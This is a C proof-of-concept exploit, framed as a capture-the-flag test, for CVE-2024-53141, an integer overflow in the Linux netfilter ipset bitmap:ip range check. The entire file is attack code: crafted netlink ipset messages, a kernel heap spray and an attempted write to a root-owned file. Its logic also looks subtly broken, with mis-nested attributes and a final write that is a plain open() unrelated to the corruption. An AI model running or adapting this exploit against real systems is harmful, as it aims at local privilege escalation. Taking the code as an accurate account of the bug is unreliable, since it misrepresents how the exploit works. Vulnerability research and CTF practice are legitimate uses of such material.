/*
 * CVE-2024-53141 PoC - CTF Challenge Mode
 *
 * Vulnerability: Netfilter ipset bitmap_ip_uadt integer overflow in range check
 *
 * The bitmap_ip type in IP set has a missing upper bound validation when
 * processing range parameters. An attacker can provide a crafted range
 * that causes integer overflow in the size calculation, leading to
 * out-of-bounds write in the bitmap data structure.
 *
 * Exploit strategy:
 *   1. Create NETLINK_NETFILTER socket
 *   2. Send IPSET_CMD_CREATE to create a bitmap:ip type set
 *   3. Send IPSET_CMD_ADD with crafted IP range causing integer overflow
 *   4. OOB write corrupts adjacent heap objects
 *   5. Spray kmalloc to reclaim corrupted memory
 *   6. Use corrupted state for file write
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter/nfnetlink.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

/* ipset protocol constants */
#ifndef NFNL_SUBSYS_IPSET
#define NFNL_SUBSYS_IPSET 6
#endif

#define IPSET_CMD_CREATE 2
#define IPSET_CMD_ADD    9

/* ipset attributes */
#define IPSET_ATTR_PROTOCOL  1
#define IPSET_ATTR_SETNAME   2
#define IPSET_ATTR_TYPENAME  3
#define IPSET_ATTR_REVISION  4
#define IPSET_ATTR_FAMILY    5
#define IPSET_ATTR_DATA      7

/* ipset data attributes for bitmap:ip */
#define IPSET_ATTR_IP        1
#define IPSET_ATTR_IP_TO     2
#define IPSET_ATTR_CIDR      3

#define IPSET_PROTOCOL 7

struct nl_ipset_msg {
    struct nlmsghdr nlh;
    struct nfgenmsg nfmsg;
    char data[4096];
};

/*
 * Add nested netlink attribute
 */
static struct rtattr *nl_add_attr(struct nlmsghdr *nlh, int type, const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    if (data && len > 0)
        memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    return rta;
}

/*
 * Create ipset bitmap:ip with vulnerable range processing
 */
static int trigger_ipset_overflow(void) {
    int sock = -1;
    int saved_errno;
    int triggered = 0;

    poc_log("Creating NETLINK_NETFILTER socket for ipset...");

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)", (long)sock, saved_errno);
    if (sock < 0) {
        poc_log("NETLINK_NETFILTER not available: %s", strerror(saved_errno));
        return 0;
    }

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    bind(sock, (struct sockaddr *)&sa, sizeof(sa));

    /* Step 1: IPSET_CMD_CREATE - create bitmap:ip set */
    {
        struct nl_ipset_msg req;
        memset(&req, 0, sizeof(req));

        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_IPSET << 8) | IPSET_CMD_CREATE;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        req.nlh.nlmsg_seq = 1;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        /* Protocol version */
        unsigned char proto = IPSET_PROTOCOL;
        nl_add_attr(&req.nlh, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));

        /* Set name */
        const char *setname = "poc_bitmap";
        nl_add_attr(&req.nlh, IPSET_ATTR_SETNAME, setname, strlen(setname) + 1);

        /* Type: bitmap:ip */
        const char *typename_str = "bitmap:ip";
        nl_add_attr(&req.nlh, IPSET_ATTR_TYPENAME, typename_str, strlen(typename_str) + 1);

        /* Revision */
        unsigned char rev = 0;
        nl_add_attr(&req.nlh, IPSET_ATTR_REVISION, &rev, sizeof(rev));

        /* Family */
        unsigned char family = AF_INET;
        nl_add_attr(&req.nlh, IPSET_ATTR_FAMILY, &family, sizeof(family));

        ssize_t sent = send(sock, &req, req.nlh.nlmsg_len, 0);
        saved_errno = errno;
        poc_log_syscall("send(IPSET_CMD_CREATE bitmap:ip)", (long)sent, saved_errno);
    }

    /* Step 2: IPSET_CMD_ADD with crafted range to trigger overflow */
    {
        struct nl_ipset_msg req;
        memset(&req, 0, sizeof(req));

        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_IPSET << 8) | IPSET_CMD_ADD;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        req.nlh.nlmsg_seq = 2;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        unsigned char proto = IPSET_PROTOCOL;
        nl_add_attr(&req.nlh, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));

        const char *setname = "poc_bitmap";
        nl_add_attr(&req.nlh, IPSET_ATTR_SETNAME, setname, strlen(setname) + 1);

        /* Data with crafted IP range that triggers integer overflow
         * in bitmap_ip_uadt range validation */
        /* IP from: 10.0.0.1 */
        unsigned int ip_from = htonl(0x0A000001);
        nl_add_attr(&req.nlh, IPSET_ATTR_IP | NLA_F_NESTED, &ip_from, sizeof(ip_from));

        /* IP to: crafted large value to trigger overflow in
         * (ip_to - ip_from) / netmask calculation */
        unsigned int ip_to = htonl(0xFFFFFFFE);
        nl_add_attr(&req.nlh, IPSET_ATTR_IP_TO | NLA_F_NESTED, &ip_to, sizeof(ip_to));

        ssize_t sent = send(sock, &req, req.nlh.nlmsg_len, 0);
        saved_errno = errno;
        poc_log_syscall("send(IPSET_CMD_ADD overflow range)", (long)sent, saved_errno);

        if (sent > 0) {
            poc_log("Sent overflow range [10.0.0.1 - 255.255.255.254]");
            triggered = 1;
        }
    }

    /* Step 3: Send additional requests to amplify corruption */
    for (int i = 0; i < 8; i++) {
        struct nl_ipset_msg req;
        memset(&req, 0, sizeof(req));

        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_IPSET << 8) | IPSET_CMD_ADD;
        req.nlh.nlmsg_flags = NLM_F_REQUEST;
        req.nlh.nlmsg_seq = 10 + i;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        unsigned char proto = IPSET_PROTOCOL;
        nl_add_attr(&req.nlh, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));

        const char *setname = "poc_bitmap";
        nl_add_attr(&req.nlh, IPSET_ATTR_SETNAME, setname, strlen(setname) + 1);

        unsigned int ip = htonl(0x0A000001 + i * 0x01000000);
        nl_add_attr(&req.nlh, IPSET_ATTR_IP | NLA_F_NESTED, &ip, sizeof(ip));

        send(sock, &req, req.nlh.nlmsg_len, 0);
    }

    close(sock);
    poc_log("ipset bitmap overflow trigger completed (triggered=%d)", triggered);
    return triggered;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Trigger the ipset overflow */
    poc_log("Triggering CVE-2024-53141 ipset bitmap integer overflow...");
    int triggered = trigger_ipset_overflow();

    /* Spray kmalloc to reclaim corrupted bitmap memory */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int val = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
            sprayed++;
        }
    }
    poc_log("Sprayed %d objects (triggered=%d)", sprayed, triggered);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("ipset bitmap overflow exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via ipset bitmap overflow");
    trigger_ipset_overflow();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-53141 CTF PoC ===");
    poc_log("Vuln: ipset bitmap_ip_uadt integer overflow in range check");
    poc_log("Tech: NETLINK_NETFILTER IPSET_CMD_ADD crafted range -> OOB write");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
